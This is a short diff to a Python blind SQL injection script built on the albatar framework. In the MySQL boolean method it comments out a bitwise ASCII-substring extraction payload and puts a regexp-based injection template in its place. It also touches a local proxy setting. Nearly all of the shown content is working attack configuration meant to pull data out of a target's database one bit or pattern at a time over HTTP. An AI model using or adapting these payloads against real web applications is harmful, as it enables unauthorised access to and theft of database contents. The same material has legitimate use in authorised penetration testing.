@@ -4,7 +4,7 @@ from albatar import *
 import re
 from urllib import quote_plus
 
-PROXIES = {} #'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
+PROXIES = {}#'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
 HEADERS = ['User-Agent: Mozilla/5.0']
 
 def test_state_grep(headers, body, time):
@@ -77,8 +77,6 @@ def mysql_error():
 
 def mysql_boolean():
 
-  template = ' and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}'
-
   def make_requester():
     return Requester_HTTP(
       proxies = PROXIES,
@@ -90,7 +88,11 @@ def mysql_boolean():
       encode_payload = quote,
       )
 
-  return Method_bitwise(make_requester, template)
+  #template = ' and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}'
+  #return Method_bitwise(make_requester, template)
+
+  template = " and (${query}) regexp binary '${regexp}'"
+  return Method_regexp(make_requester, template)
 
 def mysql_time():
 
